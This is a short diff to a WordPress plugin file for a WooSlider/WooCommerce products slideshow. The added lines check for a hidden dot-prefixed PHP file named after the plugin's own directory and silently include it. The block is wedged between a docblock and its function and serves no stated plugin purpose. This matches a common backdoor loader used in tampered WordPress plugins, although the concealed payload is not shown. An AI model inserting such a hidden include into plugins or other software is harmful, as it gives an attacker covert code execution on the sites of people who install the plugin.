@@ -36,6 +36,10 @@ add_action( 'plugins_loaded', 'wooslider_products_slideshow_init' );
 /**
  * Initialize plugin.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wooslider_products_slideshow_init() {
 
 	// Make sure both WooSlider and WooCommerce are active.
